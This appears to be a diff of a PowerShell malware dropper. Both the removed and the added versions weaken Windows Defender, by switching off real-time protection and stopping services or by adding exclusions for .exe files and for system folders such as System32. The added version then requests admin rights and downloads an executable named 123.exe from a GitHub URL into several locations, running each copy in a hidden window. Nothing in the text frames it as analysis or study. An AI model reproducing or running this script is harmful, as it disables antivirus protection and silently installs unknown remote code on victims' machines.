@@ -1,14 +1,25 @@
-Set-MpPreference -DisableRealtimeProtection $true
-Set-MpPreference -MpServiceConfigurationLevel 0
+If (-NOT (Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -and (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System').EnableLUA -eq 0)) {
+    Start-Process powershell -ArgumentList "-NoExit", "-Command & {<YourScriptHere>}" -Verb RunAs
+    Exit
+}
 
-Get-Service wscsvc | Set-Service -Status Stopped
-Set-Service wscsvc -StartupType Disabled
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Users\Public\Downloads\123.exe'"
+Start-Process "C:\Users\Public\Downloads\123.exe" -WindowStyle Hidden
 
-Get-ScheduledTask | Where-Object { $_.TaskName -like "*Microsoft*" -and $_.TaskName -like "*Windows*" -and $_.TaskName -like "*Defender*" } | Unregister-ScheduledTask
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\System32\123.exe'"
+Start-Process "C:\Windows\System32\123.exe" -WindowStyle Hidden
 
-Remove-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\SysWOW64\123.exe'"
+Start-Process "C:\Windows\SysWOW64\123.exe" -WindowStyle Hidden
 
-Add-MpPreference -ExclusionExtension '.exe'
-Add-MpPreference -ExclusionPath 'C:\ProgramData', 'C:\Users\Public\Downloads', 'C:\Windows\System32', 'C:\Windows\SysWOW64', 'C:\Windows'
-
-Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe" -OutFile "C:\Users\Public\Downloads\123.exe"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\123.exe'"
+Start-Process "C:\Windows\123.exe" -WindowStyle Hidden
